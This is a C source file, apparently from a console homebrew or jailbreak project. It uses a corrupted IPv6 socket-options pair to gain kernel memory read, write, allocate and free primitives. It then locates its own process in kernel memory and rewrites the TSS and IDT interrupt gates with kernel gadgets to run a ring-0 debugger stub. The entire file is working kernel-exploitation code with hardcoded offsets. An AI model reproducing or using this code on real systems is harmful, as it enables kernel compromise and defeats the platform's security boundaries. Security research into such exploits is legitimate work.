#include "../gdb_stub/dbg.h"
#include "../gdb_stub/trap_state.h"
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <sys/ucontext.h>
#include <sys/cpuset.h>
#include <machine/sysarch.h>
#include <signal.h>
#include <netinet/in.h>
#include <netinet/ip6.h>

int master_fd;
int victim_fd;
uintptr_t victim_pktopts;
uintptr_t kdata_base;

void* malloc(size_t size)
{
    return mmap(0, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
}

uint64_t kread8(uint64_t ptr)
{
    uint64_t offset = 0;
    if(ptr % 4096 >= 4076)
    {
        offset = ptr % 4096 - 4076;
        if(offset >= 12)
            offset = 12;
    }
    else if(ptr % 256 == 255)
        offset = 1;
    char buf[20] = {0};
    *(uint64_t*)buf = ptr - offset;
    setsockopt(master_fd, IPPROTO_IPV6, IPV6_PKTINFO, buf, 20);
    socklen_t l = 20;
    getsockopt(victim_fd, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l);
    return *(uint64_t*)(buf + offset);
}

int kwrite20(uint64_t ptr, uint64_t a, uint64_t b, uint32_t c)
{
    char buf[20] = {0};
    *(uint64_t*)buf = ptr;
    setsockopt(master_fd, IPPROTO_IPV6, IPV6_PKTINFO, buf, 20);
    *(uint64_t*)buf = a;
    *(uint64_t*)(buf + 8) = b;
    *(uint32_t*)(buf + 16) = c;
    return setsockopt(victim_fd, IPPROTO_IPV6, IPV6_PKTINFO, buf, 20);
}

int set_rthdr_size(int sock, int size)
{
    int len = ((size / 8) - 1) & ~1;
    int sz = (len + 1) * 8;
    char buf[2048] = {0};
    buf[1] = len;
    buf[3] = len / 2;
    return setsockopt(sock, IPPROTO_IPV6, IPV6_RTHDR, buf, sz);
}

uint64_t kmalloc(int sz)
{
    if(sz > 2048)
        return 0;
    if(sz < 32)
        sz = 32;
    kwrite20(victim_pktopts+112, 0, 1, 0);
    kwrite20(victim_pktopts+120, 0, 1, 0);
    set_rthdr_size(victim_fd, sz);
    uint64_t addr = kread8(victim_pktopts+112);
    kwrite20(victim_pktopts+112, 0, 1, 0);
    kwrite20(victim_pktopts+120, 0, 1, 0);
    return addr;
}

int kfree(uint64_t ptr)
{
    kwrite20(victim_pktopts+112, ptr, 0, 0);
    return setsockopt(victim_fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
}

static int the_pipe[2];
uint64_t proc;
uint64_t ofiles;
uint64_t rpipe;

static void init_pipe(void)
{
    pipe(the_pipe);
    proc = kread8(kdata_base + 0x27edcb8);
    while(proc && (int)kread8(proc+0xbc) != getpid())
        proc = kread8(proc);
    if(!proc)
        *(void* volatile*)0;
    ofiles = kread8(kread8(proc+0x48));
    rpipe = kread8(kread8(ofiles+8+48*the_pipe[0]));
}

ssize_t copyout(void* dst, uint64_t src, size_t count)
{
    if(kwrite20(rpipe, 0x4000000040000000, 0x4000000000000000, 0))
        *(void* volatile*)0;
    if(kwrite20(rpipe+15, (src<<8)|0x40, src>>56, 0))
        *(void* volatile*)0;
    getpid(); //leaks td_retval offset
    return read(the_pipe[0], dst, count);
}

ssize_t copyin(uint64_t dst, const void* src, size_t count)
{
    if(kwrite20(rpipe, 0, 0x4000000000000000, 0))
        *(void* volatile*)0;
    if(kwrite20(rpipe+15, (dst<<8)|0x40, dst>>56, 0))
        *(void* volatile*)0;
    return write(the_pipe[1], src, count);
}

void int9(void)
{
    asm volatile("int $9");
}

void int9_loop(void)
{
    asm volatile("int $9\nud2");
}

void* dlsym(void*, const char*);

uint64_t get_thread(void)
{
    int tid = *((int*(*)(void))dlsym((void*)0x2001, "pthread_self"))();
    for(uint64_t thr = kread8(proc+16); thr; thr = kread8(thr+16))
        if((int)kread8(thr+0x9c) == tid)
            return thr;
    return 0;
}

const void* memmem(const void* a, size_t sz1, const void* b, size_t sz2)
{
    for(size_t i = 0; i + sz2 <= sz1; i++)
    {
        int ok = 1;
        const char* p1 = a;
        p1 += i;
        const char* p2 = b;
        for(size_t j = 0; j < sz2 && ok; j++)
            if(p1[j] != p2[j])
                ok = 0;
        if(ok)
            return p1;
    }
    return 0;
}

void* hammer_thread(void* arg)
{
    for(;;)
        setsockopt(victim_fd, IPPROTO_IPV6, IPV6_PKTINFO, arg, 20);
}

int* cpuid(int which, int* out)
{
    asm volatile("cpuid":"=a"(out[0]),"=c"(out[1]),"=d"(out[2]),"=b"(out[3]):"a"(which));
    return out;
}

int set_sigaltstack(void)
{
    stack_t stk = {
        .ss_sp = malloc(65536),
        .ss_size = 65536,
        .ss_flags = 0
    };
    if(sigaltstack(&stk, 0))
        return -1;
    for(int i = 1; i < 32; i++)
    {
        struct sigaction sa;
        if(sigaction(i, 0, &sa))
            return -1;
        sa.sa_flags |= SA_ONSTACK;
        if(sigaction(i, &sa, 0))
            return -1;
    }
    return 0;
}

extern int in_signal_handler;
int gdbstub_main_loop(struct trap_state* ts, ssize_t* result, int* ern);
void run_in_kernel(struct regs*);

static uint64_t kstack;
uint64_t kframe;
uint64_t uretframe;

static void r0gdb_setup(void)
{
    //pin ourselves to cpu 2 (13 in apic order)
    char affinity[16] = {4};
    cpuset_setaffinity(3, 1, *((int*(*)())dlsym((void*)0x2001, "pthread_self"))(), 16, (void*)affinity);
    //resolve addresses
    uint64_t gdt = kdata_base + 0x64cee30;
    uint64_t idt = kdata_base + 0x64cdc80;
    uint64_t tss = kdata_base + 0x64d0830;
    uint64_t tss13 = tss + 13 * 0x68;
    volatile uint64_t iret = kdata_base - 0x9cf84c;
    volatile uint64_t add_rsp_0xe8_iret = iret - 7;
    volatile uint64_t swapgs_add_rsp_0xe8_iret = iret - 10;
    //set up stacks
    uint64_t gadget_stack = kmalloc(2048);
    char utss[0x68];
    copyout(utss, tss13, 0x68);
    kstack = *(volatile uint64_t*)(utss+0x3c) - 0x28;
    *(volatile uint64_t*)(utss+0x34) = gadget_stack + 0xe0;
    *(volatile uint64_t*)(utss+0x3c) = gadget_stack + 0x1f0;
    copyin(tss13, utss, 0x68);
    uint64_t tframe = gadget_stack + 0x1a0;
    kframe = gadget_stack + 0x1c8;
    uretframe = gadget_stack + 0x2b0;
    //set up trampoline frame
    kwrite20(tframe, iret, 0x20, 0);
    kwrite20(tframe+16, 2, kframe, 0);
    //set up gates
    volatile char* addr = (void*)&swapgs_add_rsp_0xe8_iret;
    char gate[16] = {0};
    gate[0] = addr[0];
    gate[1] = addr[1];
    gate[2] = 0x20;
    gate[4] = 4;
    gate[5] = 0x8e;
    gate[6] = addr[2];
    gate[7] = addr[3];
    gate[8] = addr[4];
    gate[9] = addr[5];
    gate[10] = addr[6];
    gate[11] = addr[7];
    copyin(idt+1*16, gate, 16);
    gate[4] = 3;
    gate[5] = 0xee;
    copyin(idt+9*16, gate, 16);
}

static void r0gdb_loop(void)
{
    struct trap_state ts = {0};
    ts.trap_signal = SIGTRAP;
    ts.regs.rsp = kstack;
    ts.regs.eflags = 0x102;
    for(;;)
    {
        while(__atomic_exchange_n(&in_signal_handler, 1, __ATOMIC_ACQUIRE));
        gdbstub_main_loop(&ts, 0, 0);
        __atomic_exchange_n(&in_signal_handler, 0, __ATOMIC_RELEASE);
        ts.regs.eflags &= ~0x200;
        ts.regs.eflags |= 0x102;
        run_in_kernel(&ts.regs);
    }
}

void r0gdb(void)
{
    r0gdb_setup();
    r0gdb_loop();
}

int main(void* ds, int a, int b, uintptr_t c, uintptr_t d)
{
    master_fd = a;
    victim_fd = b;
    victim_pktopts = c;
    kdata_base = d;
    init_pipe();
    dbg_enter();
    return 0; //p r0gdb() for magic
}
